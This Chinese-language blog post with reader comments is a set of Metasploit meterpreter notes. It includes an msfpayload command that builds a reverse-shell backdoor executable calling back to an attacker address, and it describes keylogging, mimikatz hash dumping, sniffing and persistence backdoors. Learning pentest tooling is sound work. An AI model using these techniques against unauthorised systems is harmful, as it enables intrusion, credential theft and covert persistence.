<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">metasploit 渗透测试笔记(meterpreter篇)</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">DM_</a> <span class="bull">·</span> <time title="2014/06/10 12:34" ui-time="" datetime="2014/06/10 12:34" class="published ng-binding ng-isolate-scope">2014/06/10 12:34</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><h2>0x01 背景</h2><hr><p>meterpreter作为后渗透模块有多种类型，并且命令由核心命令和扩展库命令组成，极大的丰富了攻击方式。 需要说明的是meterpreter在漏洞利用成功后会发送第二阶段的代码和meterpreter服务器dll，所以在网络不稳定的情况下经常出现没有可执行命令，或者会话建立执行help之后发现缺少命令。 连上vpn又在内网中使用psexec和bind_tcp的时候经常会出现这种情况，别担心结束了之后再来一次，喝杯茶就好了。</p><h2>0x02 常用类型</h2><hr><h3>reverse_tcp</h3><p>path : payload/windows/meterpreter/reverse_tcp</p><pre><code>msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.130 LPORT=8080 X &gt; ～/Desktop/backdoor.exe
</code></pre><p><img alt="enter image description here" img-src="5f68b3abb5316ddd9ba6cf0366c37b94c08e2d1a.jpg"></p><p><img alt="enter image description here" img-src="633e67d29988988d2b2d04ff4330ec4b3029ccdd.jpg"></p><p><img alt="enter image description here" img-src="8e7bb3e135505c47ae716a13cb8e54551833977d.jpg"></p><p>反向连接shell,使用起来很稳定。需要设置LHOST。</p><h3>bind_tcp</h3><p>path : payload/windows/meterpreter/bind_tcp</p><p>正向连接shell，因为在内网跨网段时无法连接到attack的机器，所以在内网中经常会使用，不需要设置LHOST。</p><h3>reverse_http/https</h3><p>path:<code>payload/windows/meterpreter/reverse_http/https</code></p><p>通过http/https的方式反向连接，在网速慢的情况下不稳定，在某博客上看到https如果反弹没有收到数据，可以将监听端口换成443试试。</p><h2>0x03 基本命令</h2><hr><p><img alt="enter image description here" img-src="65842b41416332f54633132aa90732a9ec95df0a.jpg"></p><p>常用的有</p><pre><code>background：将当前会话放置后台
load/use：加载模块
Interact：切换进一个信道
migrate：迁移进程
run：执行一个已有的模块，这里要说的是输入run后按两下tab，会列出所有的已有的脚本，常用的有autoroute,hashdump,arp_scanner,multi_meter_inject等。
Resource：执行一个已有的rc脚本。
</code></pre><h2>0x04 常用扩展库介绍</h2><hr><p><img alt="enter image description here" img-src="2e08bf5a0474e83a5ae13a3d43ca2af24ba28b78.jpg"></p><p>meterpreter中不仅有基本命令还有很多扩展库，load/use之后再输入help，就可以看到关于这个模块的命令说明了。</p><h2>stdapi command</h2><h3>文件相关</h3><p>stdapi中有关于文件读写，上传下载，目录切换，截屏，摄像头，键盘记录，和系统相关的命令。 常用的当然就是文件操作及网络有关的命令。 通常我会用upload和download进行文件上传和下载，注意在meterpreter中也可以切换目录，当然也可以编辑文件。所以就不用运行shell再用echo写。</p><p><img alt="enter image description here" img-src="22eb166125aa9e5db2b1c2826eb5a0a4809d8daf.jpg"></p><p>使用edit命令时需要注意编辑的是一个存在的文件，edit不能新建文件。 输入edit + 文件后就会调用vi编辑了。</p><p><img alt="enter image description here" img-src="e94cf4844452335240617b3b81d78faa0f51f2c0.jpg"></p><h3>网络相关</h3><p>网络命令则有列出ip信息(ipconfig),展示修改路由表(route),还有端口转发(portfwd)。 比如portfwd：</p><p><img alt="enter image description here" img-src="67dd63a15cff89f74c03e2d4ba97ac0926d4ddc3.jpg"></p><p>在建立规则之后就可以连接本地3344端口，这样远程的3389端口就转发出来了。</p><h3>键盘监听</h3><p><img alt="enter image description here" img-src="ce766b5fc19fbe985913a30ae1327685887de6de.jpg"></p><p>这里需要注意一下windows会话窗口的概念，windows桌面划分为不同的会话(session)，以便于与windows交互。会话0代表控制台，1，2代表远程桌面。所以要截获键盘输入必须在0中进行。可 以使用getdesktop查看或者截张图试试。否则使用setdesktop切换。</p><p><img alt="enter image description here" img-src="79ee07a061116efdf8b00caac89b059e5d091861.jpg"></p><p>如果不行就切换到explorer.exe进程中，这样也可以监听到远程桌面连接进来之后的键盘输入数据。</p><h3>mimikatz</h3><p>这个不多介绍，只是因为这样抓到的hash可以存进数据库方便之后调用，不知道有没有什么方法可以快速的用第三方工具抓到hash/明文然后存进数据库。</p><p><img alt="enter image description here" img-src="d25c86671f29e72eccd606d3a90321aa5a2ff1e8.jpg"></p><p>这里是因为我的用户本身就没有密码。</p><h3>sniffer</h3><p><img alt="enter image description here" img-src="7c0ce79d937c1ec0c42f1673a2d9c9b7299c5d42.jpg"></p><p>就是不知道能不能把包保存在victim上，然后后期再下下来，待实战考证。</p><h2>0x05使用自定脚本</h2><hr><p>这里的脚本可以是rc脚本，也可以是ruby脚本，metasploit已经有很多自定义脚本了。比如上面说过的arp_scanner,hashdump。这些脚本都是用ruby编写，所以对于后期自定义修改来说非常方便，这里介绍一个很常见的脚本scraper，它将目标机器上的常见信息收集起来然后下载保存在本地。推荐这个脚本是因为这个过程非常不错。可以加入自定义的命令等等。</p><p><img alt="enter image description here" img-src="fe45a61371b1799c295ccbe097584a42e53cf5fa.jpg"></p><p><img alt="enter image description here" img-src="2a18205deb0e6895632653cf58e723567138f534.jpg"></p><p><code>/.msf4/logs/</code>下保存了所有脚本需要保存的日志记录，当然不只这一个脚本。同样.msf4文件夹下还保存了其他东西，比如输入过的命令，msf运行过程的日志等。 Scraper脚本将保存结果在<code>/.msf4/logs/scripts/scraper/</code>下。</p><h2>0x06 持续性后门</h2><hr><p>metasploit自带的后门有两种方式启动的，一种是通过服务启动(metsvc)，一种是通过启动项启动(persistence) 优缺点各异:metsvc是通过服务启动，但是服务名是meterpreter,脚本代码见图，</p><p><img alt="enter image description here" img-src="2178691b12f190e88cc1fb55770a4376c20c15aa.jpg"></p><p>这里需要上传三个文件，然后用metsvc.exe 安装服务。不知道服务名能不能通过修改metsvc.exe达到。 安装过程和回连过程都很简单</p><p><img alt="enter image description here" img-src="d650b50c9b5121aeaa62f7df0d5b9faef75d2aa9.jpg"></p><p>下次回连时使用windows/metsvc&#95;bind&#95;tcp的payload就可以。</p><p><img alt="enter image description here" img-src="5907af099e580dfd9ba70b5571d950c58d938385.jpg"></p><h2>0x07 后记</h2><hr><p>meterpreter提供了很多攻击或收集信息的脚本，并且还有很多API(具体参考官方文档)，及扩展。在对ruby代码理解的程度上，如果能根据目标环境和现状修改现有脚本或编写自己的脚本则能够极大的提高效率，获得预期的结果。</p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div class="yarpp-related"><h3>为您推荐了适合您的技术文章:</h3><ol id="recommandsystem"><li><a href="http://drops.wooyun.org/tips/2143" rel="bookmark" id="re1">metasploit 渗透测试笔记(基础篇)</a></li><li><a href="http://drops.wooyun.org/tips/2443" rel="bookmark" id="re2">Mimikatz ON Metasploit</a></li><li><a href="http://drops.wooyun.org/tips/10146" rel="bookmark" id="re3">Meterpreter Guide</a></li><li><a href="http://drops.wooyun.org/tools/650" rel="bookmark" id="re4">tunna工具使用实例</a></li></ol></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">lianlian</span> <span class="reply-time">2016-05-26 01:46:12</span></div><p></p><p>我在执行回连的时候出现问题了：<br>请教如何解决</p><p>msf exploit(handler) &gt; exploit<br>[*] Started bind handler<br>[*] Starting the payload handler...<br>[-] OpenSSL::SSL::SSLError SSL_accept SYSCALL returned=5 errno=0 state=SSLv2/v3 read client hello A</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">whynot</span> <span class="reply-time">2016-05-25 21:42:06</span></div><p></p><p>@DM_ 你好我想问下0x06扩展的 我测试怎么也不成功 刚开始以为防火墙原因 关掉防火墙和电脑管家也不行<br>*] Creating a meterpreter service on port 31337<br>[*] Creating a temporary installation directory C:\Users\whynot\AppData\Local\Temp\xvbvyvNVe...<br>[*] &gt;&gt; Uploading metsrv.x86.dll...<br>[*] &gt;&gt; Uploading metsvc-server.exe...<br>[*] &gt;&gt; Uploading metsvc.exe...<br>[*] Starting the service...<br>Cannot open service manager (0x00000005)<br>[*] Trying to connect to the Meterpreter service at 192.168.116.1:31337...<br>文件确实是上传上去了 但Cannot open service manager (0x00000005)<br>@正好五个字 load mimkazi 扩展4</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Find Dream</span> <span class="reply-time">2015-11-02 16:35:56</span></div><p></p><p>meterpreter安装metsvc服务后无法回连。。目标主机已经开启端口在侦听了，怎么解决？</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">风格</span> <span class="reply-time">2015-09-07 17:17:14</span></div><p></p><p>mark</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">魔力菇</span> <span class="reply-time">2015-04-01 08:38:01</span></div><p></p><p>当然可以</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">1123</span> <span class="reply-time">2014-09-10 16:14:29</span></div><p></p><p>请问楼主用的版本是什么？</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">从容</span> <span class="reply-time">2014-06-17 23:02:18</span></div><p></p><p>不错</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">neal</span> <span class="reply-time">2014-06-17 16:13:01</span></div><p></p><p>求高手</p><p>Exception handling request: An established connection was aborted by the software in your host machine.</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">正好五个字</span> <span class="reply-time">2014-06-15 01:37:31</span></div><p></p><p>我是说我没有wdigest这个命令？奇怪？</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">一天到晚吃</span> <span class="reply-time">2014-06-12 17:03:28</span></div><p></p><p>你是说目标系统版本么?我在win7和server 2008 x64上都有问题.</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">test</span> <span class="reply-time">2014-06-12 09:28:45</span></div><p></p><p>学习</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">DM_</span> <span class="reply-time">2014-06-11 19:37:59</span></div><p></p><p>再具体就要自己看代码了哦</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">DM_</span> <span class="reply-time">2014-06-11 19:29:50</span></div><p></p><p>貌似有的版本安装就会出问题，我这里测试是正常的。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">一天到晚吃</span> <span class="reply-time">2014-06-11 19:01:32</span></div><p></p><p>不知道楼主在用persistence的时候有没有问题。victim的机器上总是弹框.执行不了后门.</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">正好五个字</span> <span class="reply-time">2014-06-11 15:48:20</span></div><p></p><p>他是怎么调用mimikatz的？</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">DM_</span> <span class="reply-time">2014-06-10 18:51:47</span></div><p></p><p>放到mof里行不行? 没有试过。</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">L9H8</span> <span class="reply-time">2014-06-10 18:41:03</span></div><p></p><p>meterpreter只适合临时使用，流量过大，网络不好，部分命令bug, 就很容易死掉，又是一次性的。<br>持续连接(不是自启动, 是断线重连)大家有什么好办法，<br>我只能用vbs监控exe执行，死掉就启动</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">mramydnei</span> <span class="reply-time">2014-06-10 17:28:36</span></div><p></p><p>不得不说我很喜欢Metasploit的设计理念</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">Evi1c0de</span> <span class="reply-time">2014-06-10 17:21:44</span></div><p></p><p>支持！</p><p></p></div></div></div></div></div></main>